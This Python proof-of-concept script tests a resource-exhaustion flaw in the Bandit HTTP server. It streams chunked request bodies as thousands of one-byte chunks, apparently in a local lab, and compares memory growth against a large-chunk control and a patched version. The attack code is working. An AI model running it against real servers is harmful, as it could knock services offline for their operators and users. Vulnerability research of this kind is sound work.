#!/usr/bin/env python3
"""
PoC: CVE-2026-111101 -- HTTP/1.1 chunked request bodies made of 1-byte
chunks amplify memory use in Bandit.
GHSA-jwh3-j29h-qfmw | affected: >= 0.1.0, < 1.14.0 | fixed: 1.14.0

Hypothesis
----------
Each chunk in a chunked-transfer-encoded body carries per-chunk framing
overhead (size line + CRLFs). If Bandit's chunk decoder allocates/retains
state proportional to the number of chunks rather than reusing a fixed
buffer, sending a body as thousands of 1-byte chunks should cost far more
server-side memory than sending the same payload as one large chunk --
for a wire cost barely larger than the payload itself.

Method
------
1. Open one raw TCP connection to the target's HTTP/1.1 listener.
2. Send a POST /echo request with `Transfer-Encoding: chunked`.
3. Stream the body as N chunks of exactly 1 byte each (`1\r\nX\r\n` per
   chunk), trickled slowly so the connection stays open and we can sample
   /admin/stats on the *target* mid-request.
4. Compare peak RSS / erlang:memory() against a control run that sends the
   same total payload as a handful of large chunks.
5. Repeat both against the patched target. A real finding is: vulnerable
   shows disproportionate growth for the 1-byte-chunk case; patched does
   not (or the growth is comparable between the two chunking strategies).

This script only ever talks to 127.0.0.1 targets declared in
config/research.yaml / config/lab-limits.yaml -- see probes/common.py.
"""
from __future__ import annotations

import argparse
import socket
import sys
import time

sys.path.insert(0, str(__import__("pathlib").Path(__file__).resolve().parents[1]))
from common import (  # noqa: E402
    MemorySampler,
    Target,
    Timer,
    require_lab_target,
    validate_duration_budget,
    validate_payload_budget,
)


def send_chunked_1byte(host: str, port: int, path: str, n_chunks: int, pace_ms: int) -> dict:
    """Send `n_chunks` chunks of 1 byte each over one connection; return timing."""
    sock = socket.create_connection((host, port), timeout=30)
    sock.settimeout(30)

    request_line = f"POST {path} HTTP/1.1\r\n"
    headers = (
        f"Host: {host}:{port}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    sock.sendall((request_line + headers).encode())

    t0 = time.monotonic()
    for i in range(n_chunks):
        chunk = f"1\r\nX\r\n".encode()
        sock.sendall(chunk)
        if pace_ms:
            time.sleep(pace_ms / 1000)
    sock.sendall(b"0\r\n\r\n")  # terminating chunk
    elapsed = time.monotonic() - t0

    try:
        resp = sock.recv(65536)
    except socket.timeout:
        resp = b""
    sock.close()

    return {
        "n_chunks": n_chunks,
        "payload_bytes": n_chunks,
        "wire_bytes_sent": len(request_line) + len(headers) + n_chunks * len(b"1\r\nX\r\n") + len(b"0\r\n\r\n"),
        "elapsed_s": round(elapsed, 3),
        "response_prefix": resp[:120].decode(errors="replace"),
    }


def send_chunked_large(host: str, port: int, path: str, total_bytes: int, chunk_size: int) -> dict:
    """Control: same total payload, sent as large chunks."""
    sock = socket.create_connection((host, port), timeout=30)
    sock.settimeout(30)

    request_line = f"POST {path} HTTP/1.1\r\n"
    headers = (
        f"Host: {host}:{port}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    sock.sendall((request_line + headers).encode())

    t0 = time.monotonic()
    sent = 0
    payload_unit = b"A" * chunk_size
    size_hdr = f"{chunk_size:x}\r\n".encode()
    while sent < total_bytes:
        this = min(chunk_size, total_bytes - sent)
        if this != chunk_size:
            sock.sendall(f"{this:x}\r\n".encode() + (b"A" * this) + b"\r\n")
        else:
            sock.sendall(size_hdr + payload_unit + b"\r\n")
        sent += this
    sock.sendall(b"0\r\n\r\n")
    elapsed = time.monotonic() - t0

    try:
        resp = sock.recv(65536)
    except socket.timeout:
        resp = b""
    sock.close()

    return {
        "n_chunks": -(-total_bytes // chunk_size),
        "payload_bytes": total_bytes,
        "elapsed_s": round(elapsed, 3),
        "response_prefix": resp[:120].decode(errors="replace"),
    }


def run(target: Target, n_chunks: int, pace_ms: int):
    print(f"== Target: {target.name} ({target.base_url}) ==")
    before = target.admin_stats()
    before_total = before["erlang_memory"]["total"]
    print(f"  admin/stats before: memory.total={before_total}")

    print(f"  sending {n_chunks} x 1-byte chunks ...")
    with Timer() as t, MemorySampler(target) as sampler:
        result = send_chunked_1byte(target.host, target.port, "/echo", n_chunks, pace_ms)
    peak_1byte = sampler.peak if sampler.peak is not None else before_total
    delta_1byte = max(0, peak_1byte - before_total)
    print(f"  done in {t.elapsed:.2f}s, wire_bytes_sent={result['wire_bytes_sent']}, "
          f"peak memory delta = {delta_1byte} bytes ({len(sampler.samples)} samples)")

    before2 = target.admin_stats()
    before2_total = before2["erlang_memory"]["total"]
    print(f"  sending control: {n_chunks} bytes as large chunks ...")
    with MemorySampler(target) as sampler2:
        control = send_chunked_large(target.host, target.port, "/echo", n_chunks, 16384)
    peak_large = sampler2.peak if sampler2.peak is not None else before2_total
    delta_large = max(0, peak_large - before2_total)
    print(f"  done, peak memory delta = {delta_large} bytes (control, "
          f"{len(sampler2.samples)} samples)")

    amplification = (delta_1byte / delta_large) if delta_large > 0 else float("inf")
    print(f"  amplification factor (1-byte-chunk delta / large-chunk delta): {amplification:.2f}x")

    return {
        "target": target.name,
        "bandit_version": before.get("bandit_version"),
        "delta_1byte_chunks_bytes": delta_1byte,
        "delta_large_chunks_bytes": delta_large,
        "peak_1byte_memory_total": peak_1byte,
        "peak_large_memory_total": peak_large,
        "sampler_samples": len(sampler.samples),
        "sampler_errors": sampler.errors + sampler2.errors,
        "amplification_factor": amplification,
        "one_byte_result": result,
        "control_result": control,
    }


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--n-chunks", type=int, default=20000, help="number of 1-byte chunks to send")
    ap.add_argument("--pace-ms", type=int, default=0, help="delay between chunks, ms (0 = as fast as possible)")
    ap.add_argument("--target", choices=["vulnerable", "interim", "patched", "both"], default="both",
                    help="'both' runs the CVE-appropriate pair (vulnerable 1.13.1 vs patched 1.14.1)")
    args = ap.parse_args()

    # Enforce the experiment bounds from config/lab-limits.yaml before opening
    # a socket. Each 1-byte chunk costs 6 wire bytes ("1\r\nX\r\n").
    validate_payload_budget(args.n_chunks * len(b"1\r\nX\r\n") + 512)
    validate_duration_budget(args.n_chunks * args.pace_ms / 1000)

    targets = require_lab_target(args.target, pair=("vulnerable", "patched"))
    results = [run(t, args.n_chunks, args.pace_ms) for t in targets]

    print("\n=== Summary ===")
    for r in results:
        print(f"{r['target']:<12} bandit={r['bandit_version']:<10} "
              f"amplification={r['amplification_factor']:.2f}x "
              f"(1-byte delta={r['delta_1byte_chunks_bytes']}B, control delta={r['delta_large_chunks_bytes']}B)")


if __name__ == "__main__":
    main()
